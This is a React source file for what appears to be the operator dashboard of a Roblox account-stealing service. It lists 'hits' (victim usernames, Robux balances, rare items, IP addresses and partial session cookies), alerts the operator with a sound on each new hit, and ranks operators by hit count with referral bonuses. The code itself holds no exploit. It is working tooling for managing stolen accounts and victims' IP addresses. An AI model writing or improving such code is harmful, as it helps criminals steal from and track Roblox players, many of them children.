import React, { useEffect, useMemo, useRef, useState } from 'react';
import { useOutletContext } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, Eye, EyeOff, Copy, Crown, Skull, Volume2, VolumeX, Mic, BadgeCheck, Coins, Users } from 'lucide-react';
import type { DashboardProfile } from './DashboardLayout';
import { getRank } from '@/config/toolsConfig';
import hitSound from '@/assets/hit-sound.mp3';

interface HitRow {
  id: string;
  tool_type: string;
  roblox_username: string | null;
  roblox_robux: number | null;
  roblox_rap: number | null;
  roblox_premium: boolean | null;
  roblox_has_korblox: boolean | null;
  roblox_has_headless: boolean | null;
  roblox_voice_enabled: boolean | null;
  roblox_age_verified: boolean | null;
  roblox_gamepass_earnings: number | null;
  roblox_robux_spent: number | null;
  roblox_summary: number | null;
  roblox_headshot_url: string | null;
  cookie_preview: string | null;
  ip_address: string | null;
  created_at: string;
}

const SOUND_PREF_KEY = 'bloxtools:sound-enabled';

const HitsPage = () => {
  const { profile } = useOutletContext<{ profile: DashboardProfile & { referral_count?: number } }>();
  const [hits, setHits] = useState<HitRow[] | null>(null);
  const [revealed, setRevealed] = useState<Record<string, boolean>>({});
  const [soundOn, setSoundOn] = useState(() => localStorage.getItem(SOUND_PREF_KEY) !== 'false');
  const [referralCount, setReferralCount] = useState<number>(0);
  const audioRef = useRef<HTMLAudioElement | null>(null);

  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, created_at';

  // Load referral count
  useEffect(() => {
    supabase
      .from('profiles')
      .select('referral_count')
      .eq('id', profile.id)
      .maybeSingle()
      .then(({ data }) => setReferralCount((data as any)?.referral_count ?? 0));
  }, [profile.id]);

  // Initial load
  useEffect(() => {
    supabase
      .from('hits')
      .select(SELECT_COLS)
      .eq('owner_id', profile.id)
      .order('created_at', { ascending: false })
      .limit(100)
      .then(({ data, error }) => {
        if (error) toast.error(error.message);
        setHits((data as HitRow[]) ?? []);
      });
  }, [profile.id]);

  // Realtime subscription — sound + toast on new hit
  useEffect(() => {
    audioRef.current = new Audio(hitSound);
    audioRef.current.volume = 0.5;

    const channel = supabase
      .channel(`hits-owner-${profile.id}`)
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'hits', filter: `owner_id=eq.${profile.id}` },
        (payload) => {
          const newHit = payload.new as HitRow;
          setHits((prev) => (prev ? [newHit, ...prev] : [newHit]));
          toast.success(`New hit: ${newHit.roblox_username || 'Unknown'} (${newHit.tool_type})`);
          if (localStorage.getItem(SOUND_PREF_KEY) !== 'false') {
            audioRef.current?.play().catch(() => {});
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [profile.id]);

  const toggleSound = () => {
    const next = !soundOn;
    setSoundOn(next);
    localStorage.setItem(SOUND_PREF_KEY, String(next));
    if (next) audioRef.current?.play().catch(() => {});
  };

  const stats = useMemo(() => {
    if (!hits) return null;
    let robux = 0, rap = 0, korblox = 0, headless = 0, gamepass = 0;
    for (const h of hits) {
      robux += h.roblox_robux ?? 0;
      rap += h.roblox_rap ?? 0;
      gamepass += h.roblox_gamepass_earnings ?? 0;
      if (h.roblox_has_korblox) korblox++;
      if (h.roblox_has_headless) headless++;
    }
    return { total: hits.length, robux, rap, korblox, headless, gamepass };
  }, [hits]);

  if (hits === null || !stats) {
    return (
      <div className="flex justify-center py-12">
        <Loader2 className="h-6 w-6 animate-spin text-blox-teal" />
      </div>
    );
  }

  // Total includes referral boost (matches leaderboard view: +5 hits per referral)
  const effectiveTotal = stats.total + referralCount * 5;
  const rank = getRank(effectiveTotal);

  const StatCard = ({ label, value }: { label: string; value: React.ReactNode }) => (
    <div className="blox-card p-4">
      <div className="text-xs uppercase text-gray-400">{label}</div>
      <div className="text-xl font-bold mt-1">{value}</div>
    </div>
  );

  const copy = (txt: string) => {
    navigator.clipboard.writeText(txt);
    toast.success('Copied');
  };

  const referralLink = `${window.location.origin}/signup?ref=${profile.username}`;

  return (
    <div className="space-y-6">
      <div className="blox-card p-5 flex items-center gap-4">
        <div className="flex-1">
          <div className="text-sm text-gray-400">Your rank</div>
          <div className="text-2xl font-bold text-blox-teal">{rank.current.name}</div>
          {rank.next && (
            <div className="text-xs text-gray-500 mt-1">
              {rank.next.min - effectiveTotal} hits until <span className="text-gray-300">{rank.next.name}</span>
            </div>
          )}
          {referralCount > 0 && (
            <div className="text-xs text-blox-teal/80 mt-1">
              Includes +{referralCount * 5} from {referralCount} referral{referralCount === 1 ? '' : 's'}
            </div>
          )}
        </div>
        <button
          onClick={toggleSound}
          className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal"
          title={soundOn ? 'Mute hit sounds' : 'Unmute hit sounds'}
        >
          {soundOn ? <Volume2 className="h-5 w-5" /> : <VolumeX className="h-5 w-5" />}
        </button>
      </div>

      {/* Referral link card */}
      <div className="blox-card p-4 flex items-center gap-3">
        <Users className="h-5 w-5 text-blox-teal shrink-0" />
        <div className="flex-1 min-w-0">
          <div className="text-sm font-semibold">Your referral link</div>
          <div className="text-xs text-gray-400">Each signup = +5 hits toward your rank. Referrals: <span className="text-blox-teal">{referralCount}</span></div>
        </div>
        <code className="hidden sm:block text-xs bg-black/40 px-2 py-1 rounded font-mono truncate max-w-[260px]">{referralLink}</code>
        <button onClick={() => copy(referralLink)} className="p-2 rounded-md hover:bg-white/5 text-gray-400 hover:text-blox-teal" title="Copy link">
          <Copy className="h-4 w-4" />
        </button>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
        <StatCard label="Total Hits" value={stats.total} />
        <StatCard label="Robux" value={stats.robux.toLocaleString()} />
        <StatCard label="RAP" value={stats.rap.toLocaleString()} />
        <StatCard label="Gamepass R$" value={stats.gamepass.toLocaleString()} />
        <StatCard label="Korblox" value={<span className="flex items-center gap-1"><Skull className="h-4 w-4 text-red-400" />{stats.korblox}</span>} />
        <StatCard label="Headless" value={<span className="flex items-center gap-1"><Crown className="h-4 w-4 text-yellow-400" />{stats.headless}</span>} />
      </div>

      <div>
        <h2 className="text-lg font-semibold mb-2">Recent Hits</h2>
        {hits.length === 0 ? (
          <div className="blox-card p-6 text-center text-gray-400">No hits yet.</div>
        ) : (
          <div className="space-y-3">
            {hits.map((h) => (
              <div key={h.id} className="blox-card p-4">
                <div className="flex items-start gap-4">
                  {h.roblox_headshot_url ? (
                    <img src={h.roblox_headshot_url} alt="" className="w-20 h-20 rounded-md bg-black/40 shrink-0 object-cover" />
                  ) : (
                    <div className="w-20 h-20 rounded-md bg-black/40 shrink-0" />
                  )}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2 flex-wrap">
                      <div className="font-semibold truncate flex items-center gap-2">
                        {h.roblox_username || 'Unknown user'}{' '}
                        <span className="text-gray-400 text-sm font-normal">— {h.tool_type}</span>
                        {h.roblox_age_verified && <BadgeCheck className="h-4 w-4 text-blox-teal" aria-label="Age verified" />}
                        {h.roblox_voice_enabled && <Mic className="h-4 w-4 text-green-400" aria-label="Voice enabled" />}
                      </div>
                      <div className="text-xs text-gray-500">{new Date(h.created_at).toLocaleString()}</div>
                    </div>
                    <div className="text-sm text-gray-400 mt-2 grid grid-cols-2 md:grid-cols-3 gap-x-4 gap-y-1">
                      <span>Robux: <span className="text-gray-200">{h.roblox_robux ?? '?'}</span></span>
                      <span>RAP: <span className="text-gray-200">{h.roblox_rap ?? '?'}</span></span>
                      <span>Premium: <span className="text-gray-200">{h.roblox_premium === null ? '?' : h.roblox_premium ? 'Yes' : 'No'}</span></span>
                      <span className="flex items-center gap-1"><Coins className="h-3 w-3" />Gamepass: <span className="text-gray-200">{h.roblox_gamepass_earnings?.toLocaleString() ?? '?'}</span></span>
                      <span>Korblox: <span className="text-gray-200">{h.roblox_has_korblox === null ? '?' : h.roblox_has_korblox ? 'Yes' : 'No'}</span></span>
                      <span>Headless: <span className="text-gray-200">{h.roblox_has_headless === null ? '?' : h.roblox_has_headless ? 'Yes' : 'No'}</span></span>
                      <span>Voice: <span className="text-gray-200">{h.roblox_voice_enabled === null ? '?' : h.roblox_voice_enabled ? 'Yes' : 'No'}</span></span>
                      <span>Verified: <span className="text-gray-200">{h.roblox_age_verified === null ? '?' : h.roblox_age_verified ? 'Yes' : 'No'}</span></span>
                      <span>IP: <span className="text-gray-200">{h.ip_address ?? '?'}</span></span>
                    </div>
                    {h.cookie_preview && (
                      <div className="mt-3 flex items-center gap-2">
                        <span className="text-xs text-gray-500">Cookie:</span>
                        <code className="text-xs bg-black/40 px-2 py-1 rounded font-mono">
                          {revealed[h.id] ? h.cookie_preview : '••••••••' + h.cookie_preview.slice(-4)}
                        </code>
                        <button onClick={() => setRevealed((r) => ({ ...r, [h.id]: !r[h.id] }))} className="text-gray-400 hover:text-blox-teal" title={revealed[h.id] ? 'Hide' : 'Show'}>
                          {revealed[h.id] ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </button>
                        <button onClick={() => copy(h.cookie_preview!)} className="text-gray-400 hover:text-blox-teal" title="Copy">
                          <Copy className="h-4 w-4" />
                        </button>
                        <span className="text-[10px] text-gray-600 ml-auto">last 16 chars stored</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default HitsPage;
